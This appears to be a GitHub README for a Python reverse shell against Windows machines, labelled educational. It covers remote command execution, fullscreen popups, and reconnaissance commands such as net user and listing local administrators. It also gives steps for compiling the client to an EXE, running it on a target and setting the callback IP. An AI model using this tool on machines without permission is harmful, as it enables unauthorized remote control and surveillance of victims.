# python-reverse-shell

⚠️ **STILL IN DEVELOPMENT** — This project has bugs and incomplete features. Use at your own risk.

A Python reverse shell for Windows. Run commands remotely, send messages, and pull system info. Educational project built from scratch.

**🔓 100% Open Source** — All code is freely available. Modify, fork, and use however you want.

## Features

- Remote command execution
- Popup message sending
- System reconnaissance (whoami, systeminfo, tasklist, etc)
- Geolocation lookup
- Interactive server/client architecture

## Quick Start

### Requirements
- Python 3.7+
- Windows target machine
- Port 2002 open between server and client

### Setup

```bash
git clone https://github.com/snippetcarried/python-reverse-shell
cd python-reverse-shell
pip install requests
```

## Usage

### Server (Your Computer)

```powershell
python server.py
```

The server listens on `0.0.0.0:2002` and waits for client connections.

### Client (Target Machine)

**Option 1: Run Python directly**
```powershell
python client.py
```

**Option 2: Compile to EXE (recommended)**
```powershell
pip install pyinstaller
pyinstaller --onefile client.py
# Then run dist/client.exe on target
```

## Commands

### Local Commands (Server-side)

| Command | Description |
|---------|-------------|
| `message <text>` | Send fullscreen popup message to target |
| `clear` | Clear screen |
| `help` | Show available commands |
| `exit` | Disconnect |

### Remote Commands (Execute on Target)

Execute any Windows command. Common examples:

**Reconnaissance:**
```
systeminfo              # Full system details
tasklist /v             # Running processes (detailed)
net user                # User accounts
net localgroup administrators  # Admin users
ipconfig /all           # Network configuration
wmic service list       # Running services
netstat -an             # Network connections
dir C:\Users            # User directories
```

**Examples:**
```
whoami                  # Current user
dir C:\                 # List directory
ipconfig                # Network info
tasklist                # Processes
Get-ComputerInfo        # PowerShell system info
```

## How It Works

Client initiates a reverse connection to the server. Server sends commands, client executes them, results come back. Pretty simple.

## Known Issues 🐛

- Message popup sometimes doesn't display on VM
- Crash command requires admin (disabled for now)
- Some wmic commands not recognized on all Windows versions
- No encryption or authentication
- Single client only

## Configuration

Edit the client IP before running. In `client.py`:

```python
ServerIP = '192.168.56.1'  # Your server IP
ServerPort = 2002
```

## Disclaimer

⚠️ **Educational use only.** Unauthorized access to computers is illegal. Only test on systems you own or have permission to test.

## License

MIT License
